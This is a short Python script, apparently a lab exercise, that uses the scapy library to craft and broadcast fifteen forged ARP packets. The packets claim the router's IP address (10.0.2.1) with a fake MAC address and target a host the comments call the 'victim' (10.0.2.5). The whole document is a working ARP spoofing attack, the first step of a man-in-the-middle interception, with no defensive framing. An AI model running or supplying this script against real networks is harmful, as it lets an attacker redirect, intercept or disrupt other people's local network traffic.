#!/usr/bin/env python

from scapy.all import *  # import everything from scapy
a= ARP() # creating an Address Resolution Protocol Packet(ARP) .
a.pdst="10.0.2.5" #victim's ip
a.hwdst="ff:ff:ff:ff:ff:ff" # to all
a.psrc="10.0.2.1" # the router's ip which is to spoofed
a.hwsrc="11:22:33:44:55:66" # attacker mac or any random mac in this case.
send(a,inter=1,count=15)

